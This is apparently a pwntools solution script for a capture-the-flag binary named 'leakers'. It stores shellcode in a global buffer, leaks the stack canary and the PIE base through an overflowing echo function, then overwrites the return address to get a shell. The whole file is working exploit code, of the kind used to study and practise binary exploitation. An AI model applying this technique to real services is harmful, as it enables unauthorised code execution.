from pwn import *

context.arch = "amd64"

CHALL_PATH = "./leakers"

CHALL = ELF("./leakers")

COMMANDS = '''
brva 0x1340
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH) 

#we have an overflow in echostring, we also can leak using echostring because it prints the content of the address where the last character is placed
#we place the exploit in name -> variable ps1

payload_ps1 = asm(shellcraft.sh())
r.recvuntil(b"name?\n")
r.sendline(payload_ps1)

#the character appended by the +1 falls in the part of the canary that has zeros at the beginning and so we append it later when we leak

payload_canary = b"A" * (0x68 + 1)
r.recvuntil(b"Echo: ")
r.send(payload_canary)

r.recvuntil(payload_canary)
canary = u64(b"\x00"+ r.recv(7))
#print("Canary: ",hex(canary))

payload_base = b"A" * (0x68 + 6*8)
r.recvuntil(b"Echo: ")
r.send(payload_base)

r.recvuntil(payload_base)
leak = r.recv(6).ljust(8, b"\x00")
CHALL.address = u64(leak) - CHALL.symbols["main"]
leak = hex(u64(leak))
#print("ELF-BASE", hex(CHALL.address))

print(hex(CHALL.symbols["ps1"]))

#overwrite return address
payload_over_seip = b"A" * (0x68)
payload_over_seip += p64(canary)
payload_over_seip += p64(0)
payload_over_seip += p64(CHALL.symbols["ps1"])
r.recvuntil(b"Echo: ")
r.send(payload_over_seip)

r.interactive()